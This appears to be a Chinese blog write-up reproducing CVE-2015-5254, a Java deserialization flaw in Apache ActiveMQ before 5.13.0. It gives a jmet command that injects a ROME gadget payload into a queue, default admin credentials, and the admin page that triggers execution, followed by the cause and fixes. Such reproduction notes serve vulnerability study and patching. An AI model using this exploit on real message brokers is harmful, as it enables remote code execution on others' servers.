## 环境展示：

![1669366522_638082fab8f6efb79dcfe.png!small?1669366521887](https://image.3001.net/images/20221125/1669366522_638082fab8f6efb79dcfe.png!small?1669366521887)

工具下载地址：https://download.csdn.net/download/HMX404/87156298

## 复现过程：

1.执行命令 ，此时会给ActiveMQ添加一个事件队列：

> java -jar jmet-0.1.0.jar -Q event -I ActiveMQ -s -Y "touch /tmp/sucess" -Yp
> ROME 192.168.66.143 61616

执行创建文件命令

![1669367350_638086368082e4555c77c.png!small?1669367349543](https://image.3001.net/images/20221125/1669367350_638086368082e4555c77c.png!small?1669367349543)

2.访问：http://192.168.66.143:8161/admin/browse.jsp?JMSDestination=event

用户名：admin 密码：admin

发现生成队列

![1669367417_63808679c46a4020ce60b.png!small?1669367416970](https://image.3001.net/images/20221125/1669367417_63808679c46a4020ce60b.png!small?1669367416970)

3.点击队列对应的编号，执行命令：

![1669368019_638088d3b93a5afcadd88.png!small?1669368018809](https://image.3001.net/images/20221125/1669368019_638088d3b93a5afcadd88.png!small?1669368018809)

  

生成文件成功，证明可以执行命令

![1669368932_63808c647298aeb42800d.png!small?1669368931367](https://image.3001.net/images/20221125/1669368932_63808c647298aeb42800d.png!small?1669368931367)

## 漏洞原理：

Apache ActiveMQ 5.13.0之前5.x版本中存在安全漏洞，该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的Java
Message Service(JMS)ObjectMessage对象利用该漏洞执行任意代码。

## 解决方法：

1.打补丁,http://activemq.apache.org/security-advisories.data/CVE-2015-5254-announcement.txt；

2.升级到最新版本；

3.有WAF的可以配置相关规则进行拦截；

> 更多资讯请访问个人博客 www.zuoci.com

